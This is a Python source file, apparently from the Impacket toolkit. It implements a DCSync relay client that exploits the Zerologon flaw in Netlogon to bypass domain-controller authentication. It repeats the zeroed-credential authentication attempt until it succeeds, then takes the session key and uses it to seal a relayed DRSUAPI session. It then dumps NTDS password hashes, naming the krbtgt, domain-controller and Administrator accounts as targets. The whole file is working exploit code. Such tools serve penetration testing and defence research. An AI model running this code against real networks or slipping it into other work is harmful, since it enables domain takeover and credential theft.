# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2020 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Author:
#   Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
#   Alberto Solino (@agsolino)
#   Arseniy Sharoglazov <mohemiv@gmail.com> / Positive Technologies (https://www.ptsecurity.com/)
#

from struct import unpack, pack
from binascii import hexlify, unhexlify
import traceback
from Cryptodome.Cipher import ARC4
from impacket import LOG, ntlm
from impacket.smbconnection import SMBConnection
from impacket.examples.ntlmrelayx.clients import ProtocolClient
from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
from impacket.ntlm import NTLMAuthChallenge, generateEncryptedSessionKey, NTLMAuthChallengeResponse, AV_PAIRS, NTLMSSP_AV_HOSTNAME, \
    NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SEAL
from impacket.spnego import SPNEGO_NegTokenResp
from impacket.dcerpc.v5 import transport, rpcrt, epm, drsuapi, nrpc
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import DCERPC_v5, MSRPCBind, CtxItem, MSRPCHeader, SEC_TRAILER, MSRPCBindAck, \
    MSRPCRespHeader, MSRPCBindNak, DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_CONNECT, \
    rpc_status_codes, rpc_provider_reason, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.examples.secretsdump import RemoteOperations, SAMHashes, NTDSHashes

PROTOCOL_CLIENT_CLASS = "DCSYNCRelayClient"

class DCSYNCRelayClientException(Exception):
    pass

class MYDCERPC_v5(DCERPC_v5):
    def __init__(self, transport):
        DCERPC_v5.__init__(self, transport)

    def sendBindType1(self, iface_uuid, auth_data):
        bind = MSRPCBind()

        item = CtxItem()
        item['AbstractSyntax'] = iface_uuid
        item['TransferSyntax'] = self.transfer_syntax
        item['ContextID'] = 0
        item['TransItems'] = 1
        bind.addCtxItem(item)

        packet = MSRPCHeader()
        packet['type'] = rpcrt.MSRPC_BIND
        packet['pduData'] = bind.getData()
        packet['call_id'] = 0

        sec_trailer = SEC_TRAILER()
        sec_trailer['auth_type']   = RPC_C_AUTHN_WINNT
        sec_trailer['auth_level']  = RPC_C_AUTHN_LEVEL_PKT_PRIVACY
        sec_trailer['auth_ctx_id'] = 79231

        pad = (4 - (len(packet.get_packet()) % 4)) % 4
        if pad != 0:
           packet['pduData'] += b'\xFF' * pad
           sec_trailer['auth_pad_len'] = pad

        packet['sec_trailer'] = sec_trailer
        packet['auth_data'] = auth_data

        self._transport.send(packet.get_packet())

        s = self._transport.recv()

        if s != 0:
            resp = MSRPCHeader(s)
        else:
            return 0 #mmm why not None?

        if resp['type'] == rpcrt.MSRPC_BINDACK or resp['type'] == rpcrt.MSRPC_ALTERCTX_R:
            bindResp = MSRPCBindAck(resp.getData())
        elif resp['type'] == rpcrt.MSRPC_BINDNAK or resp['type'] == rpcrt.MSRPC_FAULT:
            if resp['type'] == rpcrt.MSRPC_FAULT:
                resp = MSRPCRespHeader(resp.getData())
                status_code = unpack('<L', resp['pduData'][:4])[0]
            else:
                resp = MSRPCBindNak(resp['pduData'])
                status_code = resp['RejectedReason']
            if status_code in rpc_status_codes:
                raise DCERPCException(error_code = status_code)
            elif status_code in rpc_provider_reason:
                raise DCERPCException("Bind context rejected: %s" % rpc_provider_reason[status_code])
            else:
                raise DCERPCException('Unknown DCE RPC fault status code: %.8x' % status_code)
        else:
            raise DCERPCException('Unknown DCE RPC packet type received: %d' % resp['type'])

        self.set_max_tfrag(bindResp['max_rfrag'])

        return bindResp

    def sendBindType3(self, auth_data):
        sec_trailer = SEC_TRAILER()
        sec_trailer['auth_type']   = RPC_C_AUTHN_WINNT
        sec_trailer['auth_level']  = RPC_C_AUTHN_LEVEL_PKT_PRIVACY
        sec_trailer['auth_ctx_id'] = 79231

        auth3 = MSRPCHeader()
        auth3['type'] = rpcrt.MSRPC_AUTH3

        # pad (4 bytes): Can be set to any arbitrary value when set and MUST be
        # ignored on receipt. The pad field MUST be immediately followed by a
        # sec_trailer structure whose layout, location, and alignment are as
        # specified in section 2.2.2.11
        auth3['pduData'] = b'    '
        auth3['sec_trailer'] = sec_trailer
        auth3['auth_data'] = auth_data
        auth3['call_id'] = 0

        self._transport.send(auth3.get_packet(), forceWriteAndx = 1)

# Special class that allows skipping Samr connections (they are not strictly needed)
class PatchedRemoteOperations(RemoteOperations):

    def getMachineNameAndDomain(self):
        return '', ''

    def connectSamr(self, domain):
        return

class DCSYNCRelayClient(ProtocolClient):
    """
    DCSync relay client. Relays to DRSUAPI directly. Since this requires signing+sealing, it
    invokes the Zerologon vulnerability to impersonate the DC and grab the session key over Netlogon.
    """
    PLUGIN_NAME = "DCSYNC"

    def __init__(self, serverConfig, target, targetPort=None, extendedSecurity=True):
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)

        self.endpoint = serverConfig.rpc_mode

        self.endpoint_uuid = drsuapi.MSRPC_UUID_DRSUAPI

        LOG.debug("Connecting to ncacn_ip_tcp:%s[135] to determine %s stringbinding" % (target.netloc, self.endpoint))
        self.stringbinding = epm.hept_map(target.netloc, self.endpoint_uuid, protocol='ncacn_ip_tcp')

        LOG.debug("%s stringbinding is %s" % (self.endpoint, self.stringbinding))

    def initConnection(self):
        rpctransport = transport.DCERPCTransportFactory(self.stringbinding)

        if self.serverConfig.rpc_use_smb:
            LOG.info("Authenticating to smb://%s:%d with creds provided in cmdline" % (self.target.netloc, self.serverConfig.rpc_smb_port))
            rpctransport.set_credentials(self.serverConfig.smbuser, self.serverConfig.smbpass, self.serverConfig.smbdomain, \
                self.serverConfig.smblmhash, self.serverConfig.smbnthash)
            rpctransport.set_dport(self.serverConfig.rpc_smb_port)

        self.session = MYDCERPC_v5(rpctransport)
        self.session.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        self.session.connect()

        return True

    def sendNegotiate(self, auth_data):
        negoMessage = NTLMAuthNegotiate()
        negoMessage.fromString(auth_data)
        if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == 0:
            negoMessage['flags'] |= NTLMSSP_NEGOTIATE_SEAL
        self.negotiateMessage = negoMessage.getData()
        bindResp = self.session.sendBindType1(self.endpoint_uuid, self.negotiateMessage)

        self.challenge = NTLMAuthChallenge()
        self.challenge.fromString(bindResp['auth_data'])

        return self.challenge

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            auth_data = respToken2['ResponseToken']
        else:
            auth_data = authenticateMessageBlob

        remoteOps = None
        try:
            signingkey = self.netlogonSessionKey(serverChallenge, authenticateMessageBlob)
            # Something failed
            if signingkey == 0:
                return
            self.session.set_session_key(signingkey)
            authenticateMessage = NTLMAuthChallengeResponse()
            authenticateMessage.fromString(auth_data)

            # Recalc mic
            authenticateMessage['MIC'] = b'\x00' * 16
            if authenticateMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == 0:
                authenticateMessage['flags'] |= NTLMSSP_NEGOTIATE_SEAL
            newmic = ntlm.hmac_md5(signingkey, self.negotiateMessage + self.challenge.getData() + authenticateMessage.getData())
            authenticateMessage['MIC'] = newmic
            self.session.sendBindType3(authenticateMessage.getData())

            # Now perform DRS bind
            # This code comes from secretsdump directly
            request = drsuapi.DRSBind()
            request['puuidClientDsa'] = drsuapi.NTDSAPI_CLIENT_GUID
            drs = drsuapi.DRS_EXTENSIONS_INT()
            drs['cb'] = len(drs) #- 4
            drs['dwFlags'] = drsuapi.DRS_EXT_GETCHGREQ_V6 | drsuapi.DRS_EXT_GETCHGREPLY_V6 | drsuapi.DRS_EXT_GETCHGREQ_V8 | \
                             drsuapi.DRS_EXT_STRONG_ENCRYPTION
            drs['SiteObjGuid'] = drsuapi.NULLGUID
            drs['Pid'] = 0
            drs['dwReplEpoch'] = 0
            drs['dwFlagsExt'] = 0
            drs['ConfigObjGUID'] = drsuapi.NULLGUID
            # I'm uber potential (c) Ben
            drs['dwExtCaps'] = 0xffffffff
            request['pextClient']['cb'] = len(drs)
            request['pextClient']['rgb'] = list(drs.getData())
            resp = self.session.request(request)

            # Initialize remoteoperations
            if self.serverConfig.smbuser != '':
                smbConnection = SMBConnection(self.target.netloc, self.target.netloc)
                smbConnection.login(self.serverConfig.smbuser, self.serverConfig.smbpass, self.serverConfig.smbdomain, \
                self.serverConfig.smblmhash, self.serverConfig.smbnthash)
                remoteOps = RemoteOperations(smbConnection, False)
            else:
                remoteOps = PatchedRemoteOperations(None, False)

            # DRSBind's DRS_EXTENSIONS_INT(). If not, it will fail later when trying to sync data.
            drsExtensionsInt = drsuapi.DRS_EXTENSIONS_INT()

            # If dwExtCaps is not included in the answer, let's just add it so we can unpack DRS_EXTENSIONS_INT right.
            ppextServer = b''.join(resp['ppextServer']['rgb']) + b'\x00' * (
            len(drsuapi.DRS_EXTENSIONS_INT()) - resp['ppextServer']['cb'])
            drsExtensionsInt.fromString(ppextServer)

            if drsExtensionsInt['dwReplEpoch'] != 0:
                # Different epoch, we have to call DRSBind again
                LOG.debug("DC's dwReplEpoch != 0, setting it to %d and calling DRSBind again" % drsExtensionsInt[
                        'dwReplEpoch'])
                drs['dwReplEpoch'] = drsExtensionsInt['dwReplEpoch']
                request['pextClient']['cb'] = len(drs)
                request['pextClient']['rgb'] = list(drs.getData())
                resp = self.session.request(request)

            remoteOps._RemoteOperations__hDrs = resp['phDrs']

            domainName = authenticateMessage['domain_name'].decode('utf-16le')
            # Now let's get the NtdsDsaObjectGuid UUID to use when querying NCChanges
            resp = drsuapi.hDRSDomainControllerInfo(self.session, remoteOps._RemoteOperations__hDrs, domainName, 2)
            # LOG.debug('DRSDomainControllerInfo() answer')
            # resp.dump()

            if resp['pmsgOut']['V2']['cItems'] > 0:
                remoteOps._RemoteOperations__NtdsDsaObjectGuid = resp['pmsgOut']['V2']['rItems'][0]['NtdsDsaObjectGuid']
            else:
                LOG.error("Couldn't get DC info for domain %s" % domainName)
                raise Exception('Fatal, aborting')
            remoteOps._RemoteOperations__drsr = self.session

            # Initialize NTDSHashes object
            if self.serverConfig.smbuser != '':
                # We can dump all :)
                nh = NTDSHashes(None, None, isRemote=True, history=False,
                                noLMHash=False, remoteOps=remoteOps,
                                useVSSMethod=False, justNTLM=False,
                                pwdLastSet=False, resumeSession=None,
                                outputFileName='hashes', justUser=None,
                                printUserStatus=False)
                nh.dump()
            else:
                # Most important, krbtgt
                nh = NTDSHashes(None, None, isRemote=True, history=False,
                                noLMHash=False, remoteOps=remoteOps,
                                useVSSMethod=False, justNTLM=False,
                                pwdLastSet=False, resumeSession=None,
                                outputFileName='hashes', justUser=domainName + '/krbtgt',
                                printUserStatus=False)
                nh.dump()
                # Also important, DC hash (to sync fully)
                av_pairs = authenticateMessage['ntlm'][44:]
                av_pairs = AV_PAIRS(av_pairs)
                serverName = av_pairs[NTLMSSP_AV_HOSTNAME][1].decode('utf-16le')
                nh = NTDSHashes(None, None, isRemote=True, history=False,
                                noLMHash=False, remoteOps=remoteOps,
                                useVSSMethod=False, justNTLM=False,
                                pwdLastSet=False, resumeSession=None,
                                outputFileName='hashes', justUser=domainName + '/' + serverName + '$',
                                printUserStatus=False)
                nh.dump()
                # Finally, builtin\Administrator providing it was not renamed
                try:
                    nh = NTDSHashes(None, None, isRemote=True, history=False,
                                    noLMHash=False, remoteOps=remoteOps,
                                    useVSSMethod=False, justNTLM=False,
                                    pwdLastSet=False, resumeSession=None,
                                    outputFileName='hashes', justUser=domainName + '/Administrator',
                                    printUserStatus=False)
                    nh.dump()
                except Exception:
                    LOG.error('Could not dump administrator (renamed?)')

            return None, STATUS_SUCCESS
        except Exception as e:
            traceback.print_exc()
        finally:
            if remoteOps is not None:
                remoteOps.finish()

    def netlogonSessionKey(self, challenge, authenticateMessageBlob):
        # Here we will use netlogon to get the signing session key
        LOG.info("Connecting to %s NETLOGON service" % self.target.netloc)

        respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
        authenticateMessage = NTLMAuthChallengeResponse()
        authenticateMessage.fromString(respToken2['ResponseToken'])
        domainName = authenticateMessage['domain_name'].decode('utf-16le')
        flags = authenticateMessage['flags']
        try:
            av_pairs = authenticateMessage['ntlm'][44:]
            av_pairs = AV_PAIRS(av_pairs)

            serverName = av_pairs[NTLMSSP_AV_HOSTNAME][1].decode('utf-16le')
        except:
            LOG.debug("Exception:", exc_info=True)
            # We're in NTLMv1, not supported
            return STATUS_ACCESS_DENIED

        binding = epm.hept_map(self.target.netloc, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')

        dce = transport.DCERPCTransportFactory(binding).get_dce_rpc()
        dce.connect()
        dce.bind(nrpc.MSRPC_UUID_NRPC)
        MAX_ATTEMPTS = 6000
        for attempt in range(0, MAX_ATTEMPTS):
            resp = nrpc.hNetrServerReqChallenge(dce, NULL, serverName+'\x00', b'\x00'*8)

            serverChallenge = resp['ServerChallenge']

            ppp = b'\x00'*8
            try:
                nrpc.hNetrServerAuthenticate3(dce, NULL, serverName + '$\x00',
                                              nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, serverName + '\x00',
                                              ppp, 0x212effef)
            except nrpc.DCERPCSessionError as ex:
                # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
                if ex.get_error_code() == 0xc0000022:
                    continue
                else:
                    LOG.error('Unexpected error code from DC: %d.', ex.get_error_code())
            except BaseException as ex:
                LOG.error('Unexpected error: %s', str(ex))
            LOG.info('Netlogon Auth OK, successfully bypassed autentication using Zerologon after %d attempts!', attempt)
            break
        else:
            LOG.error('No success bypassing auth after 6000 attempts. Target likely patched!')
            return
        clientStoredCredential = pack('<Q', unpack('<Q',ppp)[0] + 10)

        # Now let's try to verify the security blob against the PDC

        lflags = unpack('<L', b'\xe0\x2a\x00\x00')[0]
        request = nrpc.NetrLogonSamLogonWithFlags()
        request['LogonServer'] = '\x00'
        request['ComputerName'] = serverName + '\x00'
        request['ValidationLevel'] = nrpc.NETLOGON_VALIDATION_INFO_CLASS.NetlogonValidationSamInfo4

        request['LogonLevel'] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
        request['LogonInformation']['tag'] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['LogonDomainName'] = domainName
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['ParameterControl'] = lflags
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['UserName'] = authenticateMessage[
            'user_name'].decode('utf-16le')
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['Workstation'] = ''
        request['LogonInformation']['LogonNetworkTransitive']['LmChallenge'] = challenge
        request['LogonInformation']['LogonNetworkTransitive']['NtChallengeResponse'] = authenticateMessage['ntlm']
        request['LogonInformation']['LogonNetworkTransitive']['LmChallengeResponse'] = authenticateMessage['lanman']

        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator['Credential'] = b'\x00'*8 #nrpc.ComputeNetlogonCredential(clientStoredCredential, sessionKey)
        authenticator['Timestamp'] = 0

        request['Authenticator'] = authenticator
        request['ReturnAuthenticator']['Credential'] = b'\x00'*8
        request['ReturnAuthenticator']['Timestamp'] = 0
        request['ExtraFlags'] = 0
        #request.dump()
        try:
            resp = dce.request(request)
            #resp.dump()
        except DCERPCException as e:
            LOG.debug('Exception:', exc_info=True)
            LOG.error(str(e))
            return e.get_error_code()

        LOG.info("%s\\%s successfully validated through NETLOGON" % (
        domainName, authenticateMessage['user_name'].decode('utf-16le')))

        encryptedSessionKey = authenticateMessage['session_key']
        if encryptedSessionKey != '':
            signingKey = generateEncryptedSessionKey(
                resp['ValidationInformation']['ValidationSam4']['UserSessionKey'], encryptedSessionKey)
        else:
            signingKey = resp['ValidationInformation']['ValidationSam4']['UserSessionKey']

        LOG.info("NTLM Sign/seal key: %s " % hexlify(signingKey).decode('utf-8'))
        if flags & ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY:
            self.session._DCERPC_v5__clientSigningKey = ntlm.SIGNKEY(flags, signingKey)
            self.session._DCERPC_v5__serverSigningKey = ntlm.SIGNKEY(flags, signingKey,b"Server")
            self.session._DCERPC_v5__clientSealingKey = ntlm.SEALKEY(flags, signingKey)
            self.session._DCERPC_v5__serverSealingKey = ntlm.SEALKEY(flags, signingKey,b"Server")
            # Preparing the keys handle states
            cipher3 = ARC4.new(self.session._DCERPC_v5__clientSealingKey)
            self.session._DCERPC_v5__clientSealingHandle = cipher3.encrypt
            cipher4 = ARC4.new(self.session._DCERPC_v5__serverSealingKey)
            self.session._DCERPC_v5__serverSealingHandle = cipher4.encrypt
        else:
            # Same key for everything
            self.session._DCERPC_v5__clientSigningKey = signingKey
            self.session._DCERPC_v5__serverSigningKey = signingKey
            self.session._DCERPC_v5__clientSealingKey = signingKey
            self.session._DCERPC_v5__serverSealingKey = signingKey
            cipher = ARC4.new(self.session._DCERPC_v5__clientSigningKey)
            self.session._DCERPC_v5__clientSealingHandle = cipher.encrypt
            self.session._DCERPC_v5__serverSealingHandle = cipher.encrypt
        self.session._DCERPC_v5__sequence = 0
        self.session._DCERPC_v5__flags = flags
        return signingKey

    def killConnection(self):
        if self.session is not None:
            self.session.get_rpc_transport().disconnect()
            self.session = None

    def keepAlive(self):
        return
